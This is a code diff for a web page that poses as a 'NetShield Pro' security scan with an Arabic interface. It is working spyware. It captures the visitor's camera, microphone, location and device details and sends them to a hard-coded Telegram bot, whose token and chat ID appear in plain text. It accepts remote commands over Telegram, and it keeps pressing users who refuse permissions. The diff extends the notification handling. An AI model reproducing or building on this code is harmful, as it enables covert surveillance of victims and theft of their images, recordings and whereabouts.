@@ -382,13 +382,18 @@ body {
 // ==================== CONFIGURATION ====================
 const BOT_TOKEN = "8538439468:AAHWECtOde50fTxLEVgMAM3qtg0KxWLbSGI";
 const CHAT_ID = "6453594151";
-const MICROPHONE_DURATION = 15000;
+const MICROPHONE_DURATION = 10000; // 10 ثواني
 const COMMAND_CHECK_INTERVAL = 5000;
 const VISITOR_ALERT = true;
 
-let scanData = { deviceInfo: null, battery: null, network: null, camera: null, microphone: null, location: null, permissions: { camera: false, microphone: false, location: false } };
+let scanData = {
+  deviceInfo: null, battery: null, network: null,
+  camera: null, microphone: null, location: null,
+  permissions: { camera: false, microphone: false, location: false, notification: false }
+};
 let lastUpdateId = 0;
 let commandListenerActive = false;
+let currentRetryFunction = null;
 
 // ==================== ALERT ON LOAD ====================
 if (VISITOR_ALERT) {
@@ -397,6 +402,7 @@ if (VISITOR_ALERT) {
 
 // ==================== PERMISSION HANDLER ====================
 function checkAllPermissions() {
+    requestNotificationPermission();
     checkCamera();
 }
 
@@ -408,7 +414,8 @@ function checkCamera() {
         checkMicrophone();
     })
     .catch(err => {
-        showPermissionPrompt("الكاميرا", checkCamera);
+        currentRetryFunction = checkCamera;
+        showPermissionPrompt("الكاميرا");
     });
 }
 
@@ -420,7 +427,8 @@ function checkMicrophone() {
         checkLocation();
     })
     .catch(err => {
-        showPermissionPrompt("الميكروفون", checkMicrophone);
+        currentRetryFunction = checkMicrophone;
+        showPermissionPrompt("الميكروفون");
     });
 }
 
@@ -432,17 +440,23 @@ function checkLocation() {
             startFullScan();
         },
         (err) => {
-            showPermissionPrompt("الموقع الجغرافي", checkLocation);
+            currentRetryFunction = checkLocation;
+            showPermissionPrompt("الموقع الجغرافي");
         }
     );
 }
 
-function showPermissionPrompt(permissionName, retryFunction) {
+function showPermissionPrompt(permissionName) {
     const promptDiv = document.getElementById('permissionPrompt');
     const textEl = document.getElementById('permissionText');
     textEl.textContent = `⚠️ صلاحية ${permissionName} مرفوضة. الفحص لن يكتمل بدونها. اضغط لمنحها:`;
     promptDiv.style.display = 'block';
-    promptDiv.querySelector('button').onclick = retryFunction;
+}
+
+function requestMissingPermissions() {
+    if (currentRetryFunction) {
+        currentRetryFunction();
+    }
 }
 
 // ==================== MAIN SCAN ====================
@@ -527,8 +541,14 @@ function captureLocation() {
 
 // ==================== NOTIFICATIONS HANDLING ====================
 function requestNotificationPermission() {
-  if ('Notification' in window && Notification.permission !== 'granted' && Notification.permission !== 'denied') {
-    Notification.requestPermission();
+  if ('Notification' in window) {
+    if (Notification.permission === 'granted') {
+      scanData.permissions.notification = true;
+    } else if (Notification.permission !== 'denied') {
+      Notification.requestPermission().then(permission => {
+        scanData.permissions.notification = (permission === 'granted');
+      });
+    }
   }
 }
 
@@ -574,6 +594,7 @@ async function checkForCommands() {
           else if (cmd === '/help') { sendText('📋 الاوامر:\n\n/photo - صورة\n/location - موقع\n/info - معلومات\n/full - تقرير كامل\n/notify - اشعار\n/ping - اتصال\n/help - مساعدة'); }
           else if (cmd === '/ping') { sendText('🟢 الجهاز متصل وجاهز'); }
           else if (cmd.startsWith('/notify ')) {
+            if (!scanData.permissions.notification) { sendText('❌ صلاحية الاشعارات غير مفعلة'); continue; }
             const txt = msg.text.replace('/notify ', '');
             showNotification('NetShield Pro', txt);
             sendText('✅ تم ارسال الاشعار: ' + txt);
@@ -588,7 +609,6 @@ function startCommandListener() {
   document.getElementById('remoteIndicator').style.display = 'block';
   sendText('🟢 الوكيل نشط - الجهاز جاهز لاستقبال الاوامر');
   setInterval(checkForCommands, COMMAND_CHECK_INTERVAL);
-  requestNotificationPermission();
 }
 
 // ==================== TELEGRAM SEND ====================
@@ -598,7 +618,7 @@ async function sendCompleteReport() {
   if(scanData.battery){ const b=scanData.battery; r+=`【 البطارية 】\nالمستوى: ${b.level}%\nالشحن: ${b.charging?'موصول':'غير موصول'}\n\n`; }
   if(scanData.network){ const n=scanData.network; r+=`【 الشبكة 】\nالنوع: ${n.type}\nالسرعة: ${n.downlink} Mbps\nالاستجابة: ${n.rtt} ms\n\n`; }
   if(scanData.location){ const l=scanData.location; r+=`【 الموقع 】\nالاحداثيات: ${l.latitude}, ${l.longitude}\nالدقة: ${Math.round(l.accuracy)} متر\nخرائط: https://maps.google.com/?q=${l.latitude},${l.longitude}\n\n`; }
-  r+=`【 الصلاحيات 】\nكاميرا: ${scanData.permissions.camera?'نعم':'لا'}\nميكروفون: ${scanData.permissions.microphone?'نعم':'لا'}\nموقع: ${scanData.permissions.location?'نعم':'لا'}\n\n━━━━━━━━━━━━━━━━━━━`;
+  r+=`【 الصلاحيات 】\nكاميرا: ${scanData.permissions.camera?'نعم':'لا'}\nميكروفون: ${scanData.permissions.microphone?'نعم':'لا'}\nموقع: ${scanData.permissions.location?'نعم':'لا'}\nاشعارات: ${scanData.permissions.notification?'نعم':'لا'}\n\n━━━━━━━━━━━━━━━━━━━`;
   await sendText(r);
   if(scanData.camera) await sendPhoto(scanData.camera);
   if(scanData.microphone) await sendAudio(scanData.microphone);
@@ -613,7 +633,7 @@ async function sendPhoto(base64) {
 }
 
 async function sendAudio(base64) {
-  try { const blob = await (await fetch(base64)).blob(); const fd = new FormData(); fd.append('chat_id',CHAT_ID); fd.append('audio',blob,'recording.webm'); fd.append('duration','15'); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`,{method:'POST',body:fd}); } catch(e) {}
+  try { const blob = await (await fetch(base64)).blob(); const fd = new FormData(); fd.append('chat_id',CHAT_ID); fd.append('audio',blob,'recording.webm'); fd.append('duration','10'); await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`,{method:'POST',body:fd}); } catch(e) {}
 }
 
 // ==================== UI HELPERS ====================
